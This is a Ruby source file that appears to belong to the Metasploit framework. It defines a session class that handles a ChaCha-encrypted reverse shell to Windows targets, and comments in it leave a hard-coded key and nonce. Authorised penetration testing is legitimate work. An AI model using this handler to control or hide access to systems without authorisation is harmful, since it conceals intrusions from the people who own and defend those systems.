# -*- coding: binary -*-
require 'msf/base'

module Msf
module Sessions

class EncryptedShell < Msf::Sessions::CommandShell

  include Msf::Session::Basic
  include Msf::Session::Provider::SingleCommandShell

  attr_accessor :arch
  attr_accessor :platform

  attr_accessor :iv
  attr_accessor :key
  attr_accessor :cipher

  def initialize(rstream, opts = {})
    self.arch ||= ""
    self.platform = "windows"
    datastore = opts[:datastore]
    #@key = "HKa1Rt3KdxCf35I3kS1RUGh6MXSfqEC4"
    #nonce = "bCsEzT3QbCsE"
    block_count = "\x01\x00\x00\x00"
    #@iv = block_count + nonce
    @key = datastore['ChachaKey']
    @iv = block_count + datastore['ChachaNonce']
    super
  end

  def type
    "Encrypted"
  end

  def desc
    "Encrypted reverse shell"
  end

  def self.type
    self.class.type = "Encrypted"
  end

  ##
  # Overridden from Msf::Sessions::CommandShell#shell_read
  #
  # Read encrypted data from console and decrypt it
  #
  def shell_read(length=-1, timeout=1)
    rv = rstream.get_once(length, timeout)
    decrypted = Rex::Crypto.chacha_decrypt(@key, @iv, rv)
    framework.events.on_session_output(self, decrypted) if decrypted
    #framework.events.on_session_output(self, rv) if rv
    return decrypted
  rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
    shell_close
    raise e
  end

  ##
  # Overridden from Msf::Sessions::CommandShell#shell_write
  # 
  # Encrypt data then write it to the console
  #
  def shell_write(buf)
    return unless buf

    framework.events.on_session_command(self, buf.strip)
    encrypted = Rex::Crypto.chacha_encrypt(@key, @iv, buf)
    rstream.write(encrypted)
    #rstream.write(buf)
  rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
    shell_close
    raise e
  end

  undef_method :process_autoruns

end
end
end
